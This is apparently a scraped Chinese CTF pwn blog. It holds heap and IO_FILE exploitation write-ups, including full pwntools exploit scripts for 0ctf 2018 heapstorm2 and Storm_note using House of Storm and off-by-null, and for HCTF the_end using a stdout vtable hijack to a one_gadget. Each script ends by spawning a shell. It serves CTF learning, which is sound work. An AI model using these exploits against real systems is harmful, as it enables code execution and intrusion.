'\\x00'*(0x10+0x30)edit(2,payload)dbg()\n\n\nsla('Choice: ','666')s(p64(0)*6)itr()\n\n\nexp# coding=utf-8from pwn import *#context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./Storm_note')s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims\t\t    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause()def add(size):  sla('Choice','1')  sla('?',str(size))def edit(index,text):  sla('Choice','2')  sla('?',str(index))  sa('Content',text)def free(index):  sla('Choice','3')  sla('?',str(index))#---------------布置chunk-------------------------#add(0x18)#0add(0x508)#1add(0x18)#2add(0x18)#3add(0x508)#4add(0x18)#5add(0x18)#6#dbg()#构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。edit(1,'a'*0x4f0+p64(0x500)) edit(4,'a'*0x4f0+p64(0x500)) #dbg()#----------------准备 unsorted chunk-----------------------#free(1)edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500#dbg()add(0x18)#1add(0x4d8)#7  free(1)free(2)    #dbg()#recoveradd(0x30)#1 此时chunk7可以控制原 （unsortedbin chunk  0x4f1）的bk指针add(0x4e0)#2#-------------------准备 large chunk-----------------------------------##dbg()#下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针free(4)edit(3,'a'*0x18)#off by nulladd(0x18)#4add(0x4d8)#8 0x5a0free(4)free(5)add(0x40)#4 0x580 #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#free(2)    #unsortedbin-&gt; chunk2 -&gt; chunk5(chunk8)(0x5c0)    which size is largebin FIFO #dbg()#add(0x4e8)      # put chunk8(0x5c0) to largebin#dbg()free(2) #put chunk2 to unsortedbin#dbg() #--------------修改他们是的满足条件进行 house of strom------------------------------#target = 0xabcd0100fake_chunk = target - 0x20payload = p64(0)*2 + p64(0) + p64(0x4f1) # sizepayload += p64(0) + p64(fake_chunk)      # bkedit(7,payload)#dbg()payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #sizepayload2 += p64(0) + p64(fake_chunk+8)   payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmapedit(8,payload2)#dbg()add(0x40)#dbg()payload = '\\x00'*(0x10+0x30)edit(2,payload)#dbg()sla('Choice: ','666')s(p64(0)*6)itr()\n\n0ctf_2018_heapstorm2同样是保护全开，\nmain实现四个功能，增删改查\n__int64 __fastcall main(__int64 a1, char **a2, char **a3){  __int64 v4; // [rsp+8h] [rbp-8h]   \t//v4=0x13370800  v4 = sub_BE6();  while ( 1 )  {    menu();    switch ( chioce(a1, a2) )    {      case 1LL:        a1 = v4;        add(v4);        break;      case 2LL:        a1 = v4;        up(v4);        break;      case 3LL:        a1 = v4;        delete(v4);        break;      case 4LL:        a1 = v4;        show(v4);        break;      case 5LL:        return 0LL;      default:        continue;    }  }}\n\n主函数里有个sub_BE6()函数，其中禁用了fastbin，并且用mmap在0x13370000处分配了大小为0x1000的chunk，从/dev/urandom中读取了3个随机数到0x13370800处，还调用了两个异或函数，由后面可知，是对chunk的头指针和size进行了异或加密，返回0x13370800给v4，这里相当于有四个随机数，第三个和第四个随机数相同\n__int64 sub_BE6(){  int i; // [rsp+8h] [rbp-18h]  int fd; // [rsp+Ch] [rbp-14h]  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  alarm(0x3Cu);  puts(    \"    __ __ _____________   __   __    ___    ____\\n\"    \"   / //_// ____/ ____/ | / /  / /   /   |  / __ )\\n\"    \"  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\\n\"    \" / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\\n\"    \"/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\\n\");  puts(\"===== HEAP STORM II =====\");  if ( !mallopt(1, 0) )                         // 禁用fastbin    exit(-1);  if ( mmap(0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != 322371584 )    exit(-1);  fd = open(\"/dev/urandom\", 0);  if ( fd &lt; 0 )    exit(-1);  if ( read(fd, 0x13370800, 0x18uLL) != 24 )    exit(-1);  close(fd);  MEMORY[0x13370818] = MEMORY[0x13370810];  for ( i = 0; i &lt;= 15; ++i )  {    *(16 * (i + 2LL) + 0x13370800) = ptr_xor(0x13370800, 0LL);    *(16 * (i + 2LL) + 0x13370808) = size_xor(0x13370800LL, 0LL);  }  return 0x13370800LL;}\n\nptr_xor()__int64 __fastcall ptr_xor(_QWORD *a1, __int64 a2){  return *a1 ^ a2;     //a1为第一个随机数}\n\nsize_xor()__int64 __fastcall size_xor(__int64 a1, __int64 a2){  return a2 ^ *(a1 + 8);\t//a1+8为第一个随机数}\n\nreadd函数存在一个off-by-one\nunsigned __int64 __fastcall sub_1402(__int64 a1, __int64 a2){  __int64 v3; // rax  char buf; // [rsp+17h] [rbp-19h] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-18h]  ssize_t v6; // [rsp+20h] [rbp-10h]  unsigned __int64 v7; // [rsp+28h] [rbp-8h]  v7 = __readfsqword(0x28u);  if ( !a2 )    return 0LL;  v5 = 0LL;  while ( a2 - 1 &gt; v5 )  {    v6 = read(0, &amp;buf, 1uLL);    if ( v6 &gt; 0 )    {      if ( buf == 10 )        break;      v3 = v5++;      *(v3 + a1) = buf;    }    else if ( *_errno_location() != 11 &amp;&amp; *_errno_location() != 4 )    {      break;    }  }  *(a1 + v5) = 0;                               // off-by-null  return v5;}\n\nadd函数只能申请0xC 到0x1000的chunk，且chunk的头指针和size用 了异或加密，由上面的异或函数可知只是用了前两个随机数,并且我们看到chunk的头指针和size是 在0x13370800+4*0x8处开始存放的，按照mem指针+size顺序依次存放\nvoid __fastcall add(__int64 a1){  int i; // [rsp+10h] [rbp-10h]  int size; // [rsp+14h] [rbp-Ch]  void *v3; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  {    if ( !size_xor(a1, *(16 * (i + 2LL) + a1 + 8)) )    {      printf(\"Size: \");      size = chioce();      if ( size &gt; 12 &amp;&amp; size &lt;= 4096 )      {        v3 = calloc(size, 1uLL);        if ( !v3 )          exit(-1);        *(16 * (i + 2LL) + a1 + 8) = size_xor(a1, size);        *(16 * (i + 2LL) + a1) = ptr_xor(a1, v3);        printf(\"Chunk %d Allocated\\n\", i);      }      else      {        puts(\"Invalid Size\");      }      return;    }  }}\n\nedit函数读入的数据+12要小于等于申请时写的size,我们读入的数据会追加上一个12字节字符串再加上一个0结尾，所以存在off_by_null但是prev_size无法控制。\nint __fastcall edit(_QWORD *a1){  signed int v2; // [rsp+10h] [rbp-20h]  int v3; // [rsp+14h] [rbp-1Ch]  __int64 v4; // [rsp+18h] [rbp-18h]  printf(\"Index: \");  v2 = chioce();  if ( v2 &gt; 0xF || !size_xor(a1, a1[2 * v2 + 5]) )    return puts(\"Invalid Index\");  printf(\"Size: \");  v3 = chioce();  if ( v3 &lt;= 0 || v3 &gt; (size_xor(a1, a1[2 * v2 + 5]) - 12) )    return puts(\"Invalid Size\");  printf(\"Content: \");  v4 = ptr_xor(a1, a1[2 * v2 + 4]);  sub_1377(v4, v3);  strcpy((v3 + v4), \"HEAPSTORM_II\");  return printf(\"Chunk %d Updated\\n\", v2);}\n\nfree函数不存在uaf\nint __fastcall sub_109B(_QWORD *a1){  void *v2; // rax  signed int v3; // [rsp+1Ch] [rbp-4h]  printf(\"Index: \");  v3 = chioce();  if ( v3 &gt; 0xF || !size_xor(a1, a1[2 * v3 + 5]) )    return puts(\"Invalid Index\");  v2 = ptr_xor(a1, a1[2 * v3 + 4]);  free(v2);  a1[2 * v3 + 4] = ptr_xor(a1, 0LL);  a1[2 * v3 + 5] = size_xor(a1, 0LL);  return printf(\"Chunk %d Deleted\\n\", v3);}\n\nshow函数需要满足 (a1[3] ^ a1[2]) == 0x13377331才能使用该函数，也就是第2个随机数和第3个随机数异或后为0x13377331才行\n\tint __fastcall sub_11B5(_QWORD *a1){  __int64 v2; // rbx  __int64 v3; // rax  signed int v4; // [rsp+1Ch] [rbp-14h]  if ( (a1[3] ^ a1[2]) != 0x13377331LL )    return puts(\"Permission denied\");  printf(\"Index: \");  v4 = chioce();  if ( v4 &gt; 0xF || !size_xor(a1, a1[2 * v4 + 5]) )    return puts(\"Invalid Index\");  printf(\"Chunk[%d]: \", v4);  v2 = size_xor(a1, a1[2 * v4 + 5]);  v3 = ptr_xor(a1, a1[2 * v4 + 4]);  sub_14D4(v3, v2);  return puts(byte_180A);}\n\n思路题目保护全开，我们想到的是把free_hook改为system地址，而我们首先得泄露出libc基地址，就必须利用show函数，要想利用show函数，就必须修改第3个随机数和第4个随机数的值，使它们异或后为0x13377331，随机数是在0x13370800处，我们就想到要将chunk分配到0x13370800处，程序允许我们分配最大0x1000大小的chunk，可以使用House of storm来将chunk分配到0x13370800处，这样我们不仅控制了四个随机数，还控制了chunk的全局数组\n过程先把前面的东西写好\n#coding:utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./0ctf_2018_heapstorm2')libc = ELF('./libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim,data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim,data)r       = lambda num=4096           :sh.recv(num)rl      = lambda num=4096           :sh.recvline(num)ru      = lambda delims   :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))def dbg():    gdb.attach(sh)    pause()def add(size):    sla('Command: ','1')    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000def edit(idx,content):    sla('Command: ','2')    sla('Index: ',str(idx))    sla('Size: ',str(len(content)))    sa('Content: ',content)def free(idx):    sla('Command: ','3')    sla('Index: ',str(idx))def show(idx):    sla('Command: ','4')    sla('Index: ',str(idx))\n\n和上一题一样，先构造一个unsortedbin和largebin，并且利用off-by-null来实现控制unsortedbin chunk的bk指针和largebin chunk的bk和bk_size指针，然后再malloc chunk，将chunk分配到0x13370800处，这里要注意的是这道题的edit函数有点不同，会把我们输入的字节后面加上12字节再加一个’\\x00’，所以我们每次edit都要少输入12字节即可实现0ff-by-null。\n#---------------布置chunk-------------------------#add(0x18)#0\t   add(0x508)#1add(0x18)#2add(0x18)#3   add(0x508)#4add(0x18)#5   add(0x18)#6   #----------------准备 unsorted chunk-----------------------#edit(1,'\\x00'*0x4F0+p64(0x500)) free(1)edit(0,'\\x00'*(0x18-12))add(0x18) #1 add(0x4d8) #7   free(1)   free(2) #1-2add(0x38)#1add(0x4e8)#2  #-------------------准备 large chunk-----------------------------------#edit(4,'\\x00'*0x4F0+p64(0x500))free(4)edit(3,'\\x00'*(0x18-12)) add(0x18) #4add(0x4d8) #8free(4)free(5) #4-5 add(0x48)#4  #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#free(2)add(0x4e8) free(2) #--------------修改他们是的满足条件进行 house of strom------------------------------#fake_chunk = 0x13370800 - 0x20payload = '\\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)edit(7, payload) #修改unsorted chunk的bkpayload = '\\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)edit(8, payload)  add(0x48) \n\n现在我们已经可以控制0x13370800处的值了，我们把这些随机数都改为0，然后把chunk_0改为0x13370800，以此来实现控制\n#-----------------------泄漏 libc----------------------------------##由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址payload = p64(0)*6 + p64(0x13370800)edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0dbg()\n\n\n\n之后修改0x13370800处的第三个和第四个数分别为0和0x13377331，两者异或得到0x13377331，越过show函数的检查，此时已经可以使用show函数，因为我们要泄露的unsortedbin chunk的fd指针（指向main_arena+88），我们必须在chunk的全局数组中写入0x56104462a060来show，但是程序每次运行地址不同，由上图可知fake_chunk+3处存放的就是0x56104462a060，所以我们需要利用fake_chunk+3（unsortedbin chunk的地址）来泄露libc，我们每次把chunk0的位置写为0x13370800，就可以实现每次通过chunk0来控制0x13370800\npayload = p64(0)*3 +p64(0x13377331)  #满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(fake_chunk+3) + p64(8)   #chunk1edit(0, payload) #满足show的条件show(1)  #我们刚刚house of storm 写的地址泄漏出来ru(\"]: \")heap = u64(r(6).ljust(8, '\\x00'))success(\"heap:\"+hex(heap))dbg()\n\n\n此时我们成功泄露出unsortedbin chunk的地址，我们再修改全局数组为unsortedbin chunk的地址+0x10（main_arena+88），然后即可泄露处libc基地址\npayload  = p64(0)*3 + p64(0x13377331)#满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(heap+0x10) + p64(8) #chunk1edit(0, payload)show(1) #泄漏libc地址ru(\"]: \")malloc_hook = u64(r(6).ljust(8, '\\x00')) -0x58 - 0x10libc_base = malloc_hook - libc.sym['__malloc_hook']free_hook = libc_base+libc.sym['__free_hook']system = libc_base+ libc.sym['system']success(\"free_hook:\"+hex(free_hook))dbg()\n\n\n之后我们要做到就是在全局数组里写入free hook地址和/bin/sh，将其改为system，获得shell，free_hook在chunk0处，/bin/sh\\x00在chunk1处\n#--------------修改 free_hook -----------------------------------#payload  = p64(0)*4payload += p64(free_hook) + p64(0x100)#chunk0payload += p64(0x13370800+0x40) + p64(8)#chunk1payload += '/bin/sh\\x00'edit(0, payload)dbg()\n\n之后改free_hook为system，free(1)，获得shell\nedit(0, p64(system))free(1)itr()\n\n\nexp#coding:utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./0ctf_2018_heapstorm2')libc = ELF('./libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim,data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim,data)r       = lambda num=4096           :sh.recv(num)rl      = lambda num=4096           :sh.recvline(num)ru      = lambda delims   :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))def dbg():        gdb.attach(sh)        pause()def add(size):    sla('Command: ','1')    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000def edit(idx,content):    sla('Command: ','2')    sla('Index: ',str(idx))    sla('Size: ',str(len(content)))    sa('Content: ',content)def free(idx):    sla('Command: ','3')    sla('Index: ',str(idx))def show(idx):    sla('Command: ','4')    sla('Index: ',str(idx))#---------------布置chunk-------------------------#add(0x18)#0\t add(0x508)#1add(0x18)#2add(0x18)#3   add(0x508)#4add(0x18)#5   add(0x18)#6  #----------------准备 unsorted chunk-----------------------#edit(1,'\\x00'*0x4F0+p64(0x500)) free(1)edit(0,'\\x00'*(0x18-12))  add(0x18) #1 add(0x4d8) #7  free(1)   free(2) #1-2 合并  add(0x38)#1add(0x4e8)#2   #-------------------准备 large chunk-----------------------------------#edit(4,'\\x00'*0x4F0+p64(0x500))#伪造chunkfree(4)edit(3,'\\x00'*(0x18-12)) add(0x18) #4add(0x4d8) #8  free(4)free(5) #4-5 add(0x48)#4  #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#free(2)add(0x4e8) free(2)   #--------------修改他们是的满足条件进行 house of strom------------------------------#fake_chunk = 0x13370800 - 0x20payload = '\\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)edit(7, payload) #修改unsorted chunk的bkpayload = '\\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)edit(8, payload) #修改 large chunk 的 bk 和 bk_nextsizeadd(0x48)  #2  -&gt; 0x133707e0   成功将申请到了heaparray附近 #-----------------------泄漏 libc----------------------------------##由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址payload = p64(0)*6 + p64(0x13370800)edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0#dbg() payload = p64(0)*3 +p64(0x13377331)  #满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(fake_chunk+3) + p64(8)   #chunk1edit(0, payload) #满足show的条件#dbg()show(1)  #我们刚刚house of storm 写的地址泄漏出来ru(\"]: \")heap = u64(r(6).ljust(8, '\\x00'))success(\"heap:\"+hex(heap))#dbg()payload  = p64(0)*3 + p64(0x13377331)#满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(heap+0x10) + p64(8) #chunk1edit(0, payload)#dbg()show(1) #泄漏libc地址ru(\"]: \")malloc_hook = u64(r(6).ljust(8, '\\x00')) -0x58 - 0x10libc_base = malloc_hook - libc.sym['__malloc_hook']free_hook = libc_base+libc.sym['__free_hook']system = libc_base+ libc.sym['system']success(\"free_hook:\"+hex(free_hook)) #--------------修改 free_hook -----------------------------------#payload  = p64(0)*4payload += p64(free_hook) + p64(0x100)#chunk0payload += p64(0x13370800+0x40) + p64(8)#chunk1payload += '/bin/sh\\x00'edit(0, payload)#dbg()edit(0, p64(system))free(1)itr()\n\n\n参考文章House of storm 原理及利用Largebin AttackCTF-WIKILargebin attack总结\n\n","categories":["heap"],"tags":["House of 系列"]},{"title":"IO_File的利用","url":"/2023/11/21/IO_File%E5%88%A9%E7%94%A8/","content":"【PWN】IO_FILE的利用此篇简单的学习一下IO_File的利用\nIO_FILE 的结构struct _IO_FILE {  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags   /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */   struct _IO_marker *_markers;   struct _IO_FILE *_chain;   int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};struct _IO_FILE_complete{  struct _IO_FILE _file;#endif#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001  _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  /* Wide character stream stuff.  */  struct _IO_codecvt *_codecvt;  struct _IO_wide_data *_wide_data;  struct _IO_FILE *_freeres_list;  void *_freeres_buf;# else  void *__pad1;  void *__pad2;  void *__pad3;  void *__pad4;  size_t __pad5;  int _mode;  /* Make sure we don't get into trouble again.  */  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif};\n\n IO_FILE实际上还包括在一个IO_FILE_plus中\nstruct _IO_FILE_plus{    _IO_FILE    file;    IO_jump_t   *vtable;}\n\n在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8 \nIO_FILE_plus结构通过链表链接\n    初始时形成以下顺序：\n\n    _IO_list_all  -&gt; _IO_2_1_stderr_ -&gt;  _IO_2_1_stdout_  -&gt;  _IO_2_1_stdin_\n\n_IO_list_all 是一个链表头\n后面三个文件是三个自动open的文件，它们的文件描述符为2，1，0\nstdin对应0，所以我们也可以猜想平常写的read(0,xxx,xxx)与write(1,xxx,xxx)是何含义，我们的io输入输出被抽象成了文件输入输出\n假设我们open file，其会被插入到链表头位置，类似我们之前学的fastbin 插入。\n它们会存在哪里？\n自动开启的三个文件结构（IO_FILE_plus)会被存放在libc中，后续手动开启的则会被分配在堆区。\n.data:00000000003C56F8                 dq offset _IO_file_jumps  // vtables.data:00000000003C5700                 public stderr.data:00000000003C5700 stderr          dq offset _IO_2_1_stderr_.data:00000000003C5700                                         ; DATA XREF: LOAD:000000000000BAF0↑o.data:00000000003C5700                                         ; fclose+F2↑r ....data:00000000003C5708                 public stdout.data:00000000003C5708 stdout          dq offset _IO_2_1_stdout_.data:00000000003C5708                                         ; DATA XREF: LOAD:0000000000009F48↑o.data:00000000003C5708                                         ; fclose+E9↑r ....data:00000000003C5710                 public stdin.data:00000000003C5710 stdin           dq offset _IO_2_1_stdin_.data:00000000003C5710                                         ; DATA XREF: LOAD:0000000000006DF8↑o.data:00000000003C5710                                         ; fclose:loc_6D340↑r ....data:00000000003C5718                 dq offset sub_20B70.data:00000000003C5718 _data           ends.data:00000000003C5718.bss:00000000003C5720 ; ===========================================================================\n\n那么什么是 *vtable项呢？\n*vtable是一个指针，指向一个虚表。该虚表中存放了\nvoid * funcs[] = {   1 NULL, // \"extra word\"   2 NULL, // DUMMY   3 exit, // finish   4 NULL, // overflow   5 NULL, // underflow   6 NULL, // uflow   7 NULL, // pbackfail      8 NULL, // xsputn  #printf后面讲解执行流程章节会用到此处   9 NULL, // xsgetn   10 NULL, // seekoff   11 NULL, // seekpos   12 NULL, // setbuf   13 NULL, // sync   14 NULL, // doallocate   15 NULL, // read   16 NULL, // write   17 NULL, // seek   18 pwn,  // close   19 NULL, // stat   20 NULL, // showmanyc   21 NULL, // imbue};\n\n我们还是随便打开一个程序，dbg看看它的示例吧\n\n通过 p _IO_list_all 我们可以查看该符号的地址\n\np  *(struct _IO_FILE_plus *) _IO_list_all\n\n\n我们这里可以看到vtable项、fileno项与_chain项\n_chain项指向下一个表，如stderr的chain的值就是stdout的地址，fileno存的就是该文件的文件描述符。\n那么这个虚表是干什么的？\n\n_IO_puts在过程当中调用了一个叫做_IO_sputn函数（_IO_fwrite也会调用这个），_IO_sputn其实是一个宏，它的作用就是调用_IO_2_1_stdout_中的vtable所指向的_xsputn，也就是_IO_new_file_xsputn函数\n\n这个虚表存放在哪里？\n这个虚表也存放在了data区，还记得上面有张图吧，其就在stderr的上面。\n 日常所用的输入输出函数会调用虚表中的函数\n\nfread-&gt;_IO_XSGETNfwrite-&gt;_IO_XSPUTNfopen-&gt;malloc a new file struct-&gt;make file vtable-&gt;initialization file struct-&gt;puts initialzation file in file structfclose -&gt;_IO_unlink_it-&gt;_IO_file_close_it-&gt;_IO_file_finish(_IO_FINISH)\n\n如puts会调用虚表中的_xsputn，而经过一系列操作，最终会系统调用write。\n利用_IO_2_1_stdout泄露libc iofile的相关利用，有一个很重要的效果就是泄露libc。\n设置flag位绕过检测\n\n_flags = 0xFBAD1800\n\n伪造 vtable 劫持程序流程由于我们调用io函数时，其最终会指向vtable的函数。所以我们可以通过改变vtable对应项或改变vtable指针，使其指向可利用位置，再在相应位置填写目标函数。\n在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。换言之，2.23及以后，只能通过修改vtable指针再进行利用了。\n举例2018 HCTF the_end\n\n由于sleep函数地址泄露，所以可以获得基址，于是得到偏移后虚表指针地址，one_gadget地址。\n题目拥有5字节任意地址修改能力。\n本题我们利用的是：\n\n在程序调用 exit 后，会遍历 _IO_list_all ，调用 _IO_2_1_stdout_ 下的 vtable 中 _setbuf 函数。\n\nsetbuf在虚表0x58偏移处。\n所以我们覆盖虚表指针的数值为 伪造处地址-0x58\nexp：\n# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import LibcSearchercontext(log_level = \"debug\",arch = \"amd64\")filename='./the_end.the_end'def connect():    global p,elf,libc    local = 1    if local:        p = process(['/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so', filename], env={\"LD_PRELOAD\":'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'})        # p = process(filename)    else:        p = remote(\"node4.buuoj.cn\", 25550)    elf = ELF(filename)    # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")    # libc = ELF(\"/mnt/hgfs/PWN/study_path/pwn_rm/pwn145_180/libc/64bit/libc-2.23.so\")    # libc = ELF(\"/mnt/e/CTF/PWN/varctf/buuctf/exer/4/libc-2.27.so\")    libc = ELF(\"/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\")s       = lambda data               :p.send(data)sl      = lambda data               :p.sendline(data)sa      = lambda x,data             :p.sendafter(x, data)sla     = lambda x,data             :p.sendlineafter(x, data)r       = lambda n                  :p.recv(n)rl      = lambda n                  :p.recvline(n)ru      = lambda x                  :p.recvuntil(x, drop=True)r       = lambda x                  :p.recv(x)uu64    = lambda                    :u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))itr     = lambda                    :p.interactive()leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg(addr):    gdb.attach(sh,'b *0x{}\\nc\\n'.format(addr))def db():    gdb.attach(p)def change(addr1,byte):    s(p64(addr1))    s(p8(byte))def pwn():    ru(\"here is a gift \")    sleep = int(ru(\", \"),16)    leak(\"sleep\",sleep)    libc_addr = sleep - libc.sym[\"sleep\"]    lg(\"libc_base\",libc_addr)    one_gadget = libc_addr + 0xf1247    stdout_vtable_ptr = libc_addr + libc.sym['_IO_2_1_stdout_']+0xd8    stderr_vtable_ptr = libc_addr + libc.sym['_IO_2_1_stderr_']+0xd8    lg(\"one_gadget\",one_gadget)    lg(\"stdout_vtable_ptr\",stdout_vtable_ptr)    lg(\"stderr_vtable_ptr\",stderr_vtable_ptr)    fake_vtable_addr = stderr_vtable_ptr - 0x58 # fake虚表的位置    lg(\"fake_vtable_addr\",fake_vtable_addr)    change(stdout_vtable_ptr,(fake_vtable_addr &amp; 0xff))    change(stdout_vtable_ptr+1,((fake_vtable_addr &gt;&gt; 8) &amp; 0xff)) #劫持stdout结构体的虚表指针指向fake table的位置(_IO_2_1_stderr_+128)    change(stderr_vtable_ptr,(one_gadget &amp; 0xff))    change(stderr_vtable_ptr+1,((one_gadget &gt;&gt; 8) &amp; 0xff))    change(stderr_vtable_ptr+2,((one_gadget &gt;&gt; 16) &amp; 0xff))    sl(\"exec /bin/sh 1&gt;&amp;0\")    p.interactive()connect()pwn()'''0x45226 execve(\"/bin/sh\", rsp+0x30, environ)constraints:  rax == NULL0x4527a execve(\"/bin/sh\", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf03a4 execve(\"/bin/sh\", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1247 execve(\"/bin/sh\", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''\n\nstdout_vtable_ptr -&gt; stderr_vtable_ptr - 0x58 (实际上是stderr_vtable_ptr虚表的位置)\nstderr_vtable_ptr -&gt;  one_gadget \nFSOPFile Stream Oriented Programming 面向文件流编程\n\nFSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。\n\n触发该函数需要绕过\n\nif (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))\n\n\nfp-&gt;_mode &lt;= 0\nfp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base\n\n而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：\n\n当 libc 执行 abort 流程时\n\n当执行 exit 函数时\n\n当执行流从 main 函数返回时\n\n\nctfwiki给的示例很简单，具体利用有house of  orange，后面再说。\n#define _IO_list_all 0x7ffff7dd2520#define mode_offset 0xc0#define writeptr_offset 0x28#define writebase_offset 0x20#define vtable_offset 0xd8 int main(void){    void *ptr;    long long *list_all_ptr;     ptr=malloc(0x200);     *(long long*)((long long)ptr+mode_offset)=0x0;    *(long long*)((long long)ptr+writeptr_offset)=0x1;    *(long long*)((long long)ptr+writebase_offset)=0x0;    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);    *(long long*)((long long)ptr+0x100+24)=0x41414141;    list_all_ptr=(long long *)_IO_list_all;     list_all_ptr[0]=ptr;     exit(0);}\n\nglibc 2.24 下 IO_FILE 的利用\n\n在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 